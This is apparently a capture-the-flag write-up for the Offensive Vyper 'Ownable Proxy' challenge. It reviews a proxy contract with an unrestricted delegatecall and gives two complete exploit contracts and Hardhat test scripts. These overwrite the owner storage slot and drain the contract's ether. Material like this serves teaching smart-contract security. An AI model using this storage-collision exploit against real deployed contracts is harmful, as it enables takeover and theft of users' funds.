## 1) Challenge

>{{< admonition quote "Description" >}}
>
>The Ownable Proxy contract is a proxy contract that can execute a few different calls. Your objective is to become the owner and steal any Ether in the contract.
>
>{{< /admonition >}}

Challenge created by [@jtriley_eth](https://twitter.com/jtriley_eth).


## 2) Code Review

There is only one contract, `OwnableProxy.vy` ([source code](https://github.com/JoshuaTrujillo15/offensive_vyper/blob/main/contracts/ownable-proxy/OwnableProxy.vy)) that implements a proxy contract.
```python

# @version ^0.3.2

"""
@title Ownable Proxy Contract
@author jtriley.eth
"""

# Storage paddings for external contract calls.
storage_padding: uint256[32]


owner: public(address)


@external
def __init__():
    self.owner = msg.sender


@external
def forward_call(target: address, payload: Bytes[32]):
    """
    @notice Forwards a contract call.
    @param target Address to call.
    @param payload Calldata.
    """
    raw_call(target, payload)


@external
def forward_call_with_value(
    target: address,
    payload: Bytes[32],
    msg_value: uint256
):
    """
    @notice Forward a contract call with a msg.value.
    @param target Address to call.
    @param payload Calldata.
    @dev reverts if msg.sender is not owner since, ya know, it sends value.
    """
    assert msg.sender == self.owner, "not authorized"
    assert msg_value <= self.balance, "insufficient balance"
    raw_call(target, payload, value=msg_value)


@external
def forward_delegatecall(target: address, payload: Bytes[32]):
    """
    @notice Forwards a contract delegate call.
    @param target Address to delegate call.
    @param payload Calldata.
    @dev Local storage is padded to accomodate delegated contracts.
    """
    raw_call(target, payload, is_delegate_call=True)


@external
@payable
def __default__():
    pass

```
Contract main functions:
- `forward_call` executes the `raw_call` function. It accepts a `target` and a `payload`
- `forward_call_with_value`, it is the same as above, but it also accepts a value to send. Also, it checks if the sender is the owner (line `42`) and the balance is `>=` than the value to send
- `forward_delegatecall`, same as  `forward_call`, but it executes a delegate call (`is_delegate_call` is set to `true`)

The contract has two variables: `storage_padding` and `owner`. 

Our goal is to:
- become the owner
- steal any ETH in the contract

#### How can we become the owner?

The owner is stored in `owner` variable. So we need somehow to override that value with the attacker address. When a `DELEGATECALL` is executed, the delegated contract can access the storage variables of the calling contract (in our case, the proxy contact) because the code is executed in its context. If we make our exploit contract have the same variable layout as the proxy contract, we can call the proxy `forward_delegatecall` function by specifying a function of our exploit contract. When executing this function, we can override the `owner` proxy with an address we control (the attacker address that will be the `tx.origin`).

#### How can we steal all the ETH in the proxy contract?

Once we have overwritten the `owner` variable, we can call `forward_call_with_value` by specifying the target address to be the attacker address and thus drain all the funds.

Alternatively, when the function executed by `forward_delegatecall` is called (the same that overwrites the `onwer`), we can send the proxy balance to `tx.origin` (the attacker address) by calling the `raw_call` function. In this case, when `raw_call` is executed, the `msg.sender` will be the proxy contract; thus, it will be possible to drain all its funds.


## 3) Solution

For this challenge, there are two possible solutions. In both cases, in our exploit contracts, we need to add the variables `storage_padding` and `owner` before the `target` variable to reflect the proxy variables layout.

### Solution 1

This solution sets the proxy owner to the attacker address and then sends all the proxy balance using the `raw_call` function.

`ownable-proxy.challenge.js`:
```javascript

    it('Exploit', async function () {
        // YOUR EXPLOIT HERE

        let exploit = await (await ethers.getContractFactory('OwnableProxyExploit', deployer)).deploy(this.ownableProxy.address)

        console.log(`Owner    : ${await this.ownableProxy.owner()}`)
        let balanceBefore = await ethers.provider.getBalance(attacker.address)

        await exploit.connect(attacker).run();
        
        let balanceAfter = await ethers.provider.getBalance(attacker.address)
        console.log(`New Owner: ${await this.ownableProxy.owner()}`)

        expect(balanceAfter).to.be.gt(balanceBefore)

    })

```

`OwnableProxyExploit.vy`:
```python

storage_padding: uint256[32]

owner: address

target: address

@external
def __init__(target: address):
    self.target = target

# YOUR EXPLOIT HERE
@external
def run():
    Ownableproxy(self.target).forward_delegatecall(self, method_id("changeOwner()"))

@external
def changeOwner():
    self.owner = tx.origin
    raw_call(tx.origin, b"", value=2 * 10 ** 18)

```

You can find the complete code [here](https://github.com/dellalibera/offensive_vyper-solutions/blob/main/test/ownable-proxy.challenge.js) and [here](https://github.com/dellalibera/offensive_vyper-solutions/blob/main/contracts/exploits/OwnableProxyExploit.vy).

### Solution 2

This solution sets the proxy owner to the attacker address, and then, when the transaction completes, the attacker address calls the `forward_call_with_value` function. The condition at line `42` will be satisfied because the owner is now our attacker's address. 

`ownable-proxy.challenge_2.js`:
```javascript

    it('Exploit', async function () {
        // YOUR EXPLOIT HERE

        let exploit = await (await ethers.getContractFactory('OwnableProxyExploit_2', deployer)).deploy(this.ownableProxy.address)
        
        console.log(`Owner    : ${await this.ownableProxy.owner()}`)
        let balanceBefore = await ethers.provider.getBalance(attacker.address)

        await exploit.connect(attacker).run();
        await this.ownableProxy.connect(attacker).forward_call_with_value(attacker.address, [], INITIAL_BALANCE)

        let balanceAfter = await ethers.provider.getBalance(attacker.address)
        console.log(`New Owner: ${await this.ownableProxy.owner()}`)

        expect(balanceAfter).to.be.gt(balanceBefore)

    })

```

`OwnableProxyExploit_2.vy`:
```python

storage_padding: uint256[32]

owner: address

target: address

@external
def __init__(target: address):
    self.target = target

# YOUR EXPLOIT HERE
@external
def run():
    Ownableproxy(self.target).forward_delegatecall(self, method_id("changeOwner()"))

@external
def changeOwner():
    self.owner = tx.origin

```

You can find the complete code [here](https://github.com/dellalibera/offensive_vyper-solutions/blob/main/test/ownable-proxy.challenge_2.js) and [here](https://github.com/dellalibera/offensive_vyper-solutions/blob/main/contracts/exploits/OwnableProxyExploit_2.vy).


## 4) References

- [SWC-112 - Delegatecall to Untrusted Callee](https://swcregistry.io/docs/SWC-112)